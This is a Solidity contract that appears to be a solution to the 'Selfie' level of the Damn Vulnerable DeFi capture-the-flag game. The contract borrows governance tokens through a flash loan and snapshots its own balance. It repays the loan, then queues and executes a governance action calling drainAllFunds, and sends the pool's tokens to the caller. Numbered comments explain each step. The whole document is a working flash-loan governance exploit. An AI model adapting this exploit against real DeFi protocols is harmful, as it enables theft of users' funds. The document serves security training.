pragma solidity ^0.8.0;

import "../selfie/SelfiePool.sol";
import "../selfie/SimpleGovernance.sol";
import "../DamnValuableTokenSnapshot.sol";

contract SelfieExploit {

    SelfiePool public pool;
    SimpleGovernance public governance;
    ERC20Snapshot public token;
    uint256 public action_id_queued;

    constructor(address _pool) {
        pool = SelfiePool(_pool);
        governance = pool.governance();
        token = pool.token();
    }

    // 1. We trigger the loan.
    function triggerLoan(uint _amount) public {
        pool.flashLoan(_amount);
    }
    function receiveTokens(DamnValuableTokenSnapshot _token, uint _amount) public {

        // 2. Snapshot the amount of tokens that we've loaned; the governance only checks the snapshotted amount.
        _token.snapshot();

        // 3. pay the loan back since we no longer need it.
        require(token.transfer(address(pool), _amount));

        // function queueAction(address receiver, bytes calldata data, uint256 weiAmount) external returns (uint256)

        // 4. craft the payload; we cann the onlyGovernor() function to drain all the funds(msg.sender == governance)
        action_id_queued = governance.queueAction(
            address(pool), 
            abi.encodeWithSignature(
                "drainAllFunds(address)",
                address(this)
            ),
            0
        );        
    }

    // 5. execute the crafter action; 
    function callAction() public {
        governance.executeAction(action_id_queued);

        token.transfer(msg.sender, token.balanceOf(address(this)));
    }
}